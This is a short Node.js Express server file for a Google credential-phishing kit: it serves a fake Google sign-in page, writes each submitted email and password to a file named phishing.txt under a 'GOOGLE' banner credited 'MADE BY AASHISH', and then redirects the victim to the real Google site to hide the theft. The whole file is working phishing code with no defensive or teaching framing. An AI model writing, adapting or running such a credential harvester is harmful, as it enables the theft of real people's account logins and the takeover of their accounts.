const express = require("express");
const path = require("path");
const fs = require("fs");
const bodyParser = require("body-parser");

const app = express();
const port = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the 'app' folder
app.use(express.static(path.join(__dirname, 'app')));

// Handle POST requests
app.post("/post1.php", (req, res) => {
  const { email, password } = req.body;

  // Write the POST data to phishing.txt (similar to what your PHP code does)
  const filePath = path.join(__dirname, 'phishing.txt');
  const content = `
██████████████████████████████████████████████████████████████
█                                                            █
█                        G O O G L E                         █
█                                                            █
██████████████████████████████████████████████████████████████

Email: ${email}
Password: ${password}

██████████████████████████████████████████████████████████████
█                                                            █
█                 M A D E   B Y   A A S H I S H              █
█                                                            █
██████████████████████████████████████████████████████████████
  `;
  
  fs.appendFile(filePath, content, (err) => {
    if (err) {
      console.error("Failed to write to phishing.txt:", err);
      res.status(500).send("Internal Server Error");
      return;
    }

    // Redirect user to Google (simulating the PHP behavior)
    res.redirect("https://www.google.com");
  });
});

// Serve the index.html file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, 'app', 'google.html'));
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
